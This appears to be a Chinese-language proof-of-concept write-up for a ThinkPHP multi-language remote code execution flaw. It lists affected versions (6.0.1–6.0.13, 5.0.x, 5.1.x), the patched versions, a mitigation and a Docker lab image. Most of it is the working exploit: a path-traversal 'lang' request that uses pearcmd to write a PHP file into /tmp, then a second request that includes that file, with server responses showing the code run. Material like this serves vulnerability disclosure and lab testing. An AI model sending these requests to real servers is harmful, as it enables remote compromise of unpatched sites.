# thinkphp_lang_RCE

## description

当ThinkPHP开启了多语言功能时，攻击者可以通过语言参数和目录穿越实现文件包含，进而通过文件包含实现远程代码执行。

## prerequisite

需要开启多语言功能

## vuln version

v6.0.1 <= Thinkphp <= v6.0.13  

Thinkphp v5.0.x  

Thinkphp v5.1.x

## safe version

ThinkPHP v6.0.14
ThinkPHP v5.1.42

## mitigation measures

关闭多语言功能

## vuln ENV

docker pull 7coinsec/thinkphp6013_lang_on  

docker run -it -d -p 8080:80 7coinsec/thinkphp6013_lang_on

## EXP

利用pearcmd(docker环境的PHP默认存在，且位置固定)写入文件后，包含  

REQUEST:

```
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?phpinfo();?>+/tmp/hello.php HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept: */*
Sec-GPC: 1
Accept-Language: zh-CN,zh
Accept-Encoding: gzip, deflate
Connection: close


```

RESPONSE：  

```
HTTP/1.1 200 OK
Date: Mon, 12 Dec 2022 06:47:01 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.4.0alpha2
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 3316

[1mConfiguration (channel pear.php.net):[m
=====================================
Auto-discover new Channels     auto_discover    <not set>
Default Channel                default_channel  pear.php.net
HTTP Proxy Server Address      http_proxy       <not set>
PEAR server [DEPRECATED]       master_server    <not set>
Default Channel Mirror         preferred_mirror <not set>
Remote Configuration File      remote_config    <not set>
PEAR executables directory     bin_dir          /&/<?phpinfo();?>/pear
PEAR documentation directory   doc_dir          /&/<?phpinfo();?>/pear/docs
PHP extension directory        ext_dir          /&/<?phpinfo();?>/pear/ext
PEAR directory                 php_dir          /&/<?phpinfo();?>/pear/php
PEAR Installer cache directory cache_dir        /&/<?phpinfo();?>/pear/cache
PEAR configuration file        cfg_dir          /&/<?phpinfo();?>/pear/cfg
directory
PEAR data directory            data_dir         /&/<?phpinfo();?>/pear/data
PEAR Installer download        download_dir     /&/<?phpinfo();?>/pear/download
directory
Systems manpage files          man_dir          /&/<?phpinfo();?>/pear/man
directory
PEAR metadata directory        metadata_dir     <not set>
PHP CLI/CGI binary             php_bin          <not set>
php.ini location               php_ini          <not set>
--program-prefix passed to     php_prefix       <not set>
PHP's ./configure
--program-suffix passed to     php_suffix       <not set>
PHP's ./configure
PEAR Installer temp directory  temp_dir         /&/<?phpinfo();?>/pear/temp
PEAR test directory            test_dir         /&/<?phpinfo();?>/pear/tests
PEAR www files directory       www_dir          /&/<?phpinfo();?>/pear/www
Cache TimeToLive               cache_ttl        <not set>
Preferred Package State        preferred_state  <not set>
Unix file mask                 umask            <not set>
Debug Log Level                verbose          <not set>
PEAR password (for             password         <not set>
maintainers)
Signature Handling Program     sig_bin          <not set>
Signature Key Directory        sig_keydir       <not set>
Signature Key Id               sig_keyid        <not set>
Package Signature Type         sig_type         <not set>
PEAR username (for             username         <not set>
maintainers)
User Configuration File        Filename         /tmp/hello.php
System Configuration File      Filename         #no#system#config#
Successfully created default configuration file "/tmp/hello.php"
<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V6.0.13LTS<br/><span style="font-size:30px;">16载初心不改 - 你值得信赖的PHP框架</span></p><span style="font-size:25px;">[ V6.0 版本由 <a href="https://www.yisu.com/" target="yisu">亿速云</a> 独家赞助发布 ]</span></div><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="ee9b1aa918103c4fc"></think>
```

文件包含，直接包含上一步写入的文件或者其他方式上传的文件均可  

REQUEST:  

```
GET /index.php?lang=../../../../../../../../tmp/hello HTTP/1.1
Host: 127.0.0.1:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

RESPONSE:  

```
HTTP/1.1 200 OK
Date: Mon, 12 Dec 2022 07:06:44 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.4.0alpha2
Set-Cookie: think_lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fhello; path=/
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 1034812

#PEAR_Config 0.9
a:13:{s:7:"php_dir";s:26:"/&/<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<style type="text/css">
body {background-color: #fff; color: #222; font-family: sans-serif;}
pre {margin: 0; font-family: monospace;}
a:link {color: #009; text-decoration: none; background-color: #fff;}
a:hover {text-decoration: underline;}
table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
.center {text-align: center;}
.center table {margin: 1em auto; text-align: left;}
.center th {text-align: center !important;}
td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
th {position: sticky; top: 0; background: inherit;}
h1 {font-size: 150%;}
h2 {font-size: 125%;}
.p {text-align: left;}
.e {background-color: #ccf; width: 300px; font-weight: bold;}
.h {background-color: #99c; font-weight: bold;}
.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
.v i {color: #999;}
img {float: right; border: 0;}
hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
</style>
<title>PHP 7.4.0alpha2 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
......
```

## 禁止使用本demo中的方法攻击任何非授权资产

## LINK

- https://tttang.com/archive/1865/
- https://xz.aliyun.com/t/11940
- https://github.com/7coinSec/ThinkPHPLangVulCheck
- https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
- https://ti.qianxin.com/vulnerability/detail/284921
